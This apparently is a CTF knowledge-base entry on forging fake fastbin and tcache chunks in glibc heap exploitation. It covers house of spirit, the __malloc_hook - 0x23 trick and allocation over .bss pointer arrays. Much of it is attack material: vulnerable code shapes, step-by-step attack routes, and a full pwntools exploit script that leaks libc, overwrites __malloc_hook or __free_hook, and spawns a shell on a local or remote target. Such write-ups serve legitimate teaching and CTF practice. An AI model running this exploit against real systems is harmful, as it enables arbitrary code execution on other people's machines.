---
title: "Forging Chunks - Fake fastbin and tcache Chunks on the Stack and in .bss"
category: pwn
subcategory: heap
type: technique
tags: [fake-chunk, fastbin, tcache, house-of-spirit, malloc-hook, arbitrary-allocation, bss, stack-pivot, size-field, uaf, double-free, pwndbg, gef, pwntools, one-gadget, glibc]
difficulty: medium
summary: "Make malloc return memory it never allocated by putting a plausible chunk header in front of the address you want."
when_to_use:
  - "You have a poisoned fastbin fd and need the target to pass the size check"
  - "You want an allocation on the stack to overwrite a saved return address"
  - "You want an allocation over a global pointer array in .bss"
  - "You can call free() on a pointer you fully control (house of spirit)"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [house-spirit, heap-tcache-poisoning, heap-double-free, heap-write-targets, heap-internals-primer]
---

## TL;DR

The allocator trusts the `size` field in front of whatever address it is handed.
Put `0x71` eight bytes before your target and a fastbin will happily hand you that
address. tcache is even laxer - before 2.34 it checks nothing at all, after 2.34 only
16-byte alignment. The art is finding bytes that *already* look like a size, which is
where `__malloc_hook - 0x23` comes from.

## Recognise it

- You have a tcache/fastbin poison but `malloc(): memory corruption (fast)` fires -
  your target needs a fake header.
- The binary calls `free()` on a stack buffer or on a pointer you control.
- You want a write to a *specific* stack slot (return address, canary-adjacent) rather
  than into libc.
- A global array of pointers exists in `.bss` and overwriting one entry gives you an
  arbitrary read/write through the program's own menu.

## Vulnerable code shape

```c
/* house of spirit shape: free() on attacker data */
struct obj { size_t size; char data[0x30]; };

void do_release(void) {
    struct obj o;
    read(0, &o, sizeof o);   /* o.size and o.data fully controlled, on the STACK */
    free(o.data);            /* frees a stack address -> fake chunk enters tcache */
}

/* poison shape: you already control a bin's fd */
void do_edit(void) {
    int i = read_idx();
    read(0, ptr[i], sz[i]);  /* writes into a freed chunk -> fd = &fake_chunk */
}
```

## Theory

Targets: glibc 2.23 - 2.39, with different check sets per bin.

### What `free()` checks before accepting a pointer

```c
/* _int_free, entry */
if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
    || __builtin_expect (misaligned_chunk (p), 0))
  malloc_printerr ("free(): invalid pointer");
if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
  malloc_printerr ("free(): invalid size");

/* fastbin path only */
if (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size)) <= 2 * SIZE_SZ, 0)
    || __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0))
  malloc_printerr ("free(): invalid next size (fast)");
```

So a **fake fastbin chunk** needs:

1. `p` (= `target - 0x10`) 16-byte aligned.
2. `size` at `p + 0x8`: `MINSIZE <= size <= global_max_fast` (0x80 by default),
   16-byte aligned, flags whatever you like.
3. At `p + size + 0x8`: a value in `(0x10, av->system_mem)`. `av->system_mem` is
   0x21000 for a default single-arena process. So anything between 0x20 and 0x20FF0
   works - a lot of random memory qualifies.

A **fake tcache chunk** needs, on 2.26-2.33: **nothing**. `tcache_put` reads only
`csize2tidx(size)` from the *pointer being freed*, so for house-of-spirit the size
must be right, but for a *poisoned* `entries[]` the allocator never looks at the
target's header at all. From 2.34 the only extra requirement is `aligned_OK(e)`.

### The `0x7f` trick (glibc 2.23 - 2.31, fastbin only)

Around `__malloc_hook` in libc there is a run of bytes that reads as `0x000000000000007f`
when interpreted as a qword. Specifically, for most builds:

```
__malloc_hook - 0x10 : 0x00007f....    (a pointer: __memalign_hook or padding)
__malloc_hook - 0x08 : 0x00007f....
```

Reading a *misaligned* qword at `__malloc_hook - 0x23 + 0x8 = __malloc_hook - 0x1b`
yields `0x000000000000007f`. `0x7f & ~0xf = 0x70`, and `fastbin_index(0x7f)` is
`(0x7f >> 4) - 2 = 5`, the index for 0x70 chunks. So:

```
fake_chunk = __malloc_hook - 0x23
malloc(0x60)  ->  returns __malloc_hook - 0x23 + 0x10 = __malloc_hook - 0x13
write 0x13 bytes of padding then 8 bytes -> lands exactly on __malloc_hook
```

This is *misaligned* by design, which is why 2.34's `aligned_OK` kills it for tcache -
but the fastbin path in 2.32/2.33 still accepts it.

Exact byte offsets differ per build. Find it yourself:

```
pwndbg> find_fake_fast &__malloc_hook
```

`pwndbg`'s `find_fake_fast` scans backwards for any address whose qword makes a valid
fastbin size for a given target. Use it; do not memorise `-0x23`.

### Fake chunks in .bss

A global `char *ptr[16]` array is ideal: point a tcache `next` at
`&ptr[0] - 0x10` (so the "chunk" starts there), allocate, and now your write covers
the whole pointer array. Every subsequent `show`/`edit` becomes an arbitrary
read/write through the program's own code. You need `ptr - 0x10` to be 16-byte aligned
(usually true) and, for 2.34+, that is the only requirement.

If a size field is required (fastbin path), find writable bytes just before the array -
often a length counter you can set to 0x71 through the menu itself.

### Fake chunks on the stack

With a stack leak (from `environ` in libc, or a leaked saved rbp), point an allocation
at `saved_rip - 0x18` and write a ROP chain. Constraints: the same alignment, plus you
must not clobber something the current frame needs before it returns.
`libc.sym['environ']` holds a stack pointer, so:

```
stack_leak = read8(libc.sym['environ'])
target     = stack_leak - OFFSET_TO_SAVED_RIP    # find OFFSET once in gdb
```

## Attack

**Route A - fastbin 0x7f over `__malloc_hook` (glibc 2.23 - 2.27).**

1. Fill tcache[0x70] if the libc has tcache: `alloc(0..6, 0x68)`, `free(0..6)`.
2. `alloc(7, 0x68)` -> A, `alloc(8, 0x68)` -> B.
3. `free(7)`, `free(8)`, `free(7)` - fastbin dup: `fastbin[5] = A -> B -> A`.
4. `alloc(9, 0x68, p64(fake))` where `fake = __malloc_hook - 0x23` - sets `A->fd`.
5. `alloc(10, 0x68)` - returns B.
6. `alloc(11, 0x68)` - returns A.
7. `alloc(12, 0x68, b"\x00"*0x13 + p64(one_gadget))` - returns `fake + 0x10`,
   and the payload lands on `__malloc_hook`.
8. Trigger any `malloc()` -> the one_gadget runs.

**Route B - tcache into .bss (glibc 2.26 - 2.39).**

1. `alloc(0, 0x48)` -> A, `alloc(1, 0x48)` -> B.
2. `free(0)`, `free(1)` - tcache[3]: B -> A.
3. `edit(1, p64(bss_ptr_array - 0x10))` (mangle on 2.32+).
4. `alloc(2, 0x48)` - returns B.
5. `alloc(3, 0x48, p64(libc.sym['__free_hook']) * 2)` - returns the .bss chunk; now
   `ptr[0]` and `ptr[1]` both point at `__free_hook`.
6. `edit(0, p64(system))` - the program itself writes `system` into `__free_hook`.

## Heap state

```text
Route A: the 0x7f fake chunk

  libc:
    __malloc_hook - 0x23  +0x00 | ... (prev_size, ignored)   |
                          +0x08 | 0x000000000000007f         |  <-- "size"
                          +0x10 | <- malloc returns HERE     |
                          ...
    __malloc_hook         +0x13 from the returned pointer

  checks:
    fastbin_index(0x7f) = (0x7f >> 4) - 2 = 5     == idx for 0x70   OK
    chunk_at_offset(p, 0x70)->size : whatever libc has there, must be
      in (0x10, 0x21000). On stock builds it is, which is why this works.


Route B: fake chunk over a .bss pointer array

  .bss:
    ptr - 0x10  | anything (treated as prev_size) |
    ptr - 0x08  | anything (treated as size)      |   <- tcache ignores it (<2.34)
    ptr + 0x00  | ptr[0]  <- malloc returns HERE  |
    ptr + 0x08  | ptr[1]                          |
    ...

  after step 5:
    ptr[0] = &__free_hook
    ptr[1] = &__free_hook
  now edit(0, p64(system)) writes through the program's own edit routine.
```

## Exploit

```python
#!/usr/bin/env python3
"""Forged chunks: (A) the 0x7f fastbin chunk over __malloc_hook, and
(B) a tcache chunk laid over the binary's .bss pointer array.

Route A targets glibc 2.23 - 2.31. Route B works 2.26 - 2.39.

Usage:
    ./exploit.py            # route B (default, works everywhere)
    ./exploit.py FASTBIN    # route A
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

FAST = 0x68        # 0x70 chunk -> fastbin index 5, matches a 0x7f size field
SMALL = 0x48       # 0x50 chunk

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return io.recvline().rstrip(b"\n")


def edit(i, d):
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def lk(raw):
    return u64(raw.ljust(8, b"\x00")[:8])


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


def find_fake_fast(blob, base, want_idx=5):
    """Scan a memory blob for an offset whose qword is a valid fastbin size.

    `blob` is bytes read from the target starting at `base`. Returns candidate
    absolute addresses for the fake CHUNK (not the user pointer).
    """
    out = []
    for off in range(0, len(blob) - 16):
        size = u64(blob[off + 8:off + 16])
        masked = size & ~0x0F
        if masked < 0x20 or masked > 0x80:
            continue
        if ((size >> 4) - 2) != want_idx:
            continue
        out.append(base + off)
    return out


# ------------------------------------------------------------------ leaks
alloc(20, 0x418, b"leaker")
alloc(21, 0x18, b"guard")
free(20)
libc.address = lk(show(20)) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)


def route_a_fastbin():
    """0x7f fake chunk in front of __malloc_hook, reached via a fastbin dup."""
    malloc_hook = libc.sym["__malloc_hook"]
    fake = malloc_hook - 0x23          # verify per-build with pwndbg find_fake_fast
    log.info("fake chunk @ %#x (__malloc_hook - 0x23)", fake)

    # saturate tcache[5] so the frees reach the fastbin
    for i in range(7):
        alloc(i, FAST, b"filler")
    for i in range(7):
        free(i)

    alloc(7, FAST, b"A" * 8)
    alloc(8, FAST, b"B" * 8)
    free(7)
    free(8)
    free(7)                            # fastbin[5]: A -> B -> A

    for i in range(7):
        alloc(i, FAST, b"drain")       # empty tcache; refill pulls A, B, A back

    alloc(9, FAST, p64(fake))          # A->fd = fake
    alloc(10, FAST, b"pad")
    alloc(11, FAST, b"pad")
    # the allocation lands at fake + 0x10 = __malloc_hook - 0x13
    one_gadget = libc.address + int(args.ONEGADGET or "0x4f2c5", 0)
    alloc(12, FAST, b"\x00" * 0x13 + p64(one_gadget))
    log.success("__malloc_hook = %#x", one_gadget)
    alloc(13, 0x18, b"trigger")        # any malloc now runs the gadget


def route_b_bss():
    """Fake tcache chunk over the binary's global pointer array."""
    if elf.pie:
        log.warning("binary is PIE: you need a binary leak for this route")
    bss_ptrs = elf.sym.get("ptr", elf.bss(0x40))
    fake = bss_ptrs - 0x10
    assert fake % 0x10 == 0, "2.34+ needs the returned pointer 16-byte aligned"
    log.info("fake chunk @ %#x (ptr array - 0x10)", fake)

    alloc(0, SMALL, b"A" * 8)
    alloc(1, SMALL, b"B" * 8)
    free(0)
    free(1)                            # tcache[3]: B -> A

    poison = fake + 0x10               # what tcache_get must hand back
    if args.SAFELINK:
        # need B's user address; read it from the debugger once
        b_user = int(args.BUSER, 0)
        poison = mangle(b_user, poison)
    edit(1, p64(poison))

    alloc(2, SMALL, b"consume B")
    target = libc.sym["__free_hook"] if "__free_hook" in libc.sym \
        else libc.sym["_IO_2_1_stdout_"]
    alloc(3, SMALL, p64(target) * 2)   # ptr[0] = ptr[1] = &target
    log.success("ptr[0] now points at %#x", target)

    edit(0, p64(libc.sym["system"]))   # the program writes system into the hook
    alloc(4, 0x18, b"/bin/sh\x00")
    free(4)


if args.FASTBIN:
    route_a_fastbin()
else:
    route_b_bss()

io.interactive()
```

## Variants & pitfalls

- **`find_fake_fast` beats guessing.** `pwndbg> find_fake_fast &__malloc_hook 0x70`
  prints every usable offset for the exact libc you were given.
- **`av->system_mem` is per-arena and grows.** Early in a process it is 0x21000; after
  heavy allocation it can be much larger, which *loosens* the next-size check.
- **tcache does not check the size on the malloc side**, only on the free side.
  So a poison into an arbitrary address works even if the "size" there is nonsense -
  until 2.34's alignment check.
- **House of spirit is the free-side version.** If the program frees a pointer you
  control, forge the header yourself and get the address back from malloc. See
  `house-spirit`.
- **Stack fake chunks need a stack leak.** `libc.sym['environ']` contains a stack
  pointer; read it with any arbitrary read (including an allocation over a `.bss`
  pointer array as in route B).
- **Do not forget the second size field.** For the fastbin path you need a plausible
  size at `fake + size + 8`, not just at `fake + 8`.
- **`malloc(): unaligned tcache chunk detected` (2.34+)** means your target is not
  16-byte aligned. Shift the target, or use the fastbin path if the libc still allows it.
- **Writable-but-not-mapped.** A .bss target past the end of the segment segfaults on
  the first write; check the mapping with `vmmap`.

## Debugging

```text
pwndbg> find_fake_fast &__malloc_hook        # the canonical helper
pwndbg> find_fake_fast &__free_hook 0x70
pwndbg> x/4gx <fake_chunk>
pwndbg> p av->system_mem
pwndbg> vmmap                                # is the target page writable?
pwndbg> tcache
pwndbg> bins
gef>  heap bins fast
gef>  vmmap
```

```bash
# Locate the global pointer array in a non-PIE binary.
nm ./chal | grep -iE ' b | d ' | head -20
objdump -t ./chal | grep -i bss
```

## Tools

- `pwndbg find_fake_fast` - stop hand-computing `-0x23`.
- `one_gadget` for the hook payload.
- `checksec` / `vmmap` to confirm the target page is writable.

## References

- shellphish `how2heap`: `house_of_spirit.c`, `fastbin_dup_into_stack.c`,
  `tcache_house_of_spirit.c`.
- CTF Wiki, "Fastbin Attack" chapter.
- glibc `malloc/malloc.c`: `_int_free` validation, `_int_malloc` fastbin path.
